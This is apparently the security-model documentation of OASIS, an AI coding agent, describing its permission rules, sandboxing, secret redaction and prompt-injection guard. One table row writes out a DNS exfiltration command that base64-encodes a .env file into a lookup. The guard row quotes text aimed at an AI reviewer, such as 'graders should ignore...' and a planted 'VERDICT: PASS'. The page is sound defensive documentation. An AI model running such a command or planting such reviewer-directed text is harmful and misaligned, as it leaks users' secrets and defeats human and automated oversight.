# Security model

This page describes what OASIS enforces, where in the code, and what falls
outside its controls. To report a vulnerability, see
[SECURITY.md](../SECURITY.md) in the repository root.

OASIS runs with the permissions of the user who started it. Its controls
narrow what the agent does by default. They are not a guarantee that a
malicious repository, extension or model cannot do harm.

## Controls OASIS enforces

| Control | What it does | Source |
| --- | --- | --- |
| Permission modes and rules | `allow` / `ask` / `deny` rules for tools, commands and paths; plan mode is read-only; edits and commands ask by default | `src/permissions.mjs`, `src/settings.mjs` |
| Command risk analysis | Parses shell commands and flags destructive, network, credential and privilege-changing forms before they run, including secrets sent out through a substituted URL or a name lookup (`dig $(base64 < .env).example`) | `src/shell-risk.mjs`, `src/git-safety.mjs`, `src/network-safety.mjs` |
| OS sandbox (opt-in) | bubblewrap on Linux, `sandbox-exec` on macOS, or a Docker/Podman container: read-only host, writable workspace, network off unless enabled, common credential folders masked | `src/sandbox.mjs` |
| Remote execution (opt-in) | `"backend": "ssh"` or `"daytona"` runs commands on another machine or a Daytona cloud sandbox, with the workspace synced over rsync; the Daytona token stays in a mode 600 ssh config. See [Execution backends](EXECUTION-BACKENDS.md) | `src/ssh-backend.mjs`, `src/daytona-backend.mjs` |
| Unix-socket block (with the OS sandbox) | Sandboxed commands cannot connect to host Unix sockets such as `/var/run/docker.sock` or an SSH agent: a seccomp filter (the `apply-seccomp` helper from `@anthropic-ai/sandbox-runtime`) refuses `socket(AF_UNIX, …)` on Linux x64/arm64, and the macOS profile denies Unix-socket connects. `sandbox.network.allowAllUnixSockets` / `allowUnixSockets` (macOS only) reopen them and are read from your own settings, `--settings` or policy, never from a repository. On other Linux architectures there is no filter, and `oasis doctor` reports that as a problem | `src/sandbox.mjs` |
| Repository locks | A repository's `allowRead`/`allowWrite` entries cannot reopen a path your own settings deny reading. With an admin-required sandbox (managed `allowManagedDomainsOnly`, or `allowUnsandboxedCommands: false` from policy or `--settings`), a repository's `excludedCommands`, `allowedDomains`, `allowWrite` and `additionalDirectories` give commands nothing, and it cannot turn off a sandbox you enabled | `src/settings.mjs` (`applySandboxLocks`) |
| Domain allow-list (opt-in) | With `sandbox.allowedDomains`, commands go through a proxy that allows only those hosts | `src/sandbox-runtime.mjs` |
| Secret shield (on by default) | Secrets found in tool output are replaced with placeholders before the model sees them; written logs, sessions and artifacts are redacted with the same rules (Gitleaks-derived) | `src/secret-shield.mjs` |
| Prompt-injection guard (on by default) | Web pages, search results, browser text, MCP results, replies from remote A2A agents and the output of shell commands that fetch outside text (`curl`, `wget`, `gh issue view`, `gh pr view`, `gh api`, `glab`) lose hidden Unicode instructions, and text that reads like instructions to an AI is marked as data. After such a result, actions that send data out or change remote state need a person for the rest of the turn, even in auto or bypass mode: shell commands, `git_push`, `create_pull_request`, remote agents, installs and MCP or provider configuration, MCP tools not marked read-only, fetches whose URL carries a query (or a body), and browser typing or script evaluation. Saving a memory, skill proposal, user-profile conclusion, notification or scheduled job is held too, so an injected page cannot plant instructions that later sessions act on. Plain page reads continue. Turns that start without a person typing keep the hold: goal follow-ups (`/goal` and `oasis -p --goal`), `--review` and JSON-schema follow-ups, `/loop` runs after the first, and background-event wake-ups. The `verify` agent (goal verifier, `--review`) also checks the files the judged agent changed for text aimed at it ("note to the reviewer", "graders should ignore...", a pre-written `VERDICT: PASS` comment); a hit is shown to it as not-evidence and its PASS does not count. The same goes for output of the judged code that prints a `VERDICT: PASS` line or tells the reviewer what to decide. Such a hit voids the review only; the main agent is not put under the injection hold, since the text came from its own work, and the next review round can still run checks. Nested tool calls inside `execute_code` are guarded the same way, and so is a later read of a file such a command saved (`read_file`, or `cat`, `head` and the like in the shell) (`curl -o`, `wget -O`, `gh ... > file`). The hold follows the content between agents: the report of a subagent that read a flagged result, its teammate messages, its knowledge-board findings and the shared tasks and checkpoints it writes carry the mark, and the agent that receives them gets the same hold. It also flows down: a held agent cannot get the action done by starting, resuming or messaging a subagent, which inherits the hold | `src/untrusted-content.mjs` |
| Workspace trust | An untrusted workspace cannot enable its own hooks, MCP servers, or settings that loosen permissions or change where OASIS writes | `src/settings.mjs`, `src/agent.mjs` |
| MCP tool inspection | Tool descriptions with instruction-like or hidden content are withheld and need approval; tool definitions are pinned and a changed definition needs approval again | `src/mcp-trust.mjs` |
| MCP calls | Each MCP tool call asks for approval unless the mode or rules allow it; lazy servers re-check the live tool before calling it | `src/mcp.mjs`, `src/mcp-lazy.mjs` |
| Network servers | The web app binds to `127.0.0.1`, always needs its access token, and refuses a non-loopback address without TLS unless `--allow-insecure-lan` is given; the Codex app-server WebSocket refuses a non-loopback address without `--ws-auth` | `src/web.mjs`, `src/remote-access.mjs`, `src/codex-app-server-ws.mjs` |
| Spend limits | `--max-budget-usd`, `--max-requests`, `--max-total-tokens` and zero-budget mode, shared by subagents and reviews | `src/cost-policy.mjs`, `src/pricing.mjs` |

## What is outside these controls

Being explicit here matters more than claiming coverage:

- The sandbox is off unless you enable it (`"sandbox": { "enabled": true }`
  or `OASIS_SANDBOX=1`). Without it, approved commands run with your full
  permissions. On platforms without a backend, OASIS says so and relies on
  approvals.
- MCP servers, hooks and plugin commands run as normal processes on your
  machine, not inside the command sandbox. Treat installing one like
  installing any program.
- Approval prompts are a review step, not isolation. A command you approve
  can do anything your user can.
- Credential masking in the sandbox covers common folders (`~/.ssh`,
  `~/.aws`, `~/.config/gh` and others). It is defence in depth, not full
  read isolation.
- The secret shield recognises known secret formats. A secret in an
  unrecognised format can still reach the model.
- Spend limits apply to model requests OASIS sends itself. External CLIs,
  MCP servers and hooks that call paid APIs are not counted or blocked.
- Hosted model providers receive the prompts and tool output you send them.
  Use a local model when that is not acceptable.

## Known dependency advisories

`npm audit` on 14 November 2026: the CLI and agent runtime (`package-lock.json`)
have no known advisories. The desktop app's build tooling (`desktop/`) has six
moderate entries, all one advisory:
[GHSA-g3hv-75wg-m249](https://github.com/advisories/GHSA-g3hv-75wg-m249),
pattern amplification in `minimatch` 7.0.0–11.0.0, reached through
`electron-builder` 26.18.0. It needs an attacker to supply the glob pattern;
`electron-builder` only matches the project's own packaging globs at build time,
and it is not part of the installed app. npm's suggested fix is a downgrade to
`electron-builder` 24; it is not applied. An override to `minimatch` 11.0.1 would
be checked by the release build on Windows, macOS and Linux before it is adopted.

## Recommended setup for untrusted code

1. Do not trust the workspace (`oasis trust` is not run), so its hooks, MCP
   servers and permission settings stay off. `oasis trust` lists the hook
   commands, allow rules, permission mode, status line and `.mcp.json` servers
   it would turn on and asks first; without a terminal it needs `--yes`.
2. Turn on the sandbox and leave its network off, or allow only the domains
   you need.
3. Keep the default `ask` behaviour for edits and commands, or use plan mode
   to read only.
4. Use `--zero-budget` or a local model when cost matters, and
   `--max-requests` to bound a long run.
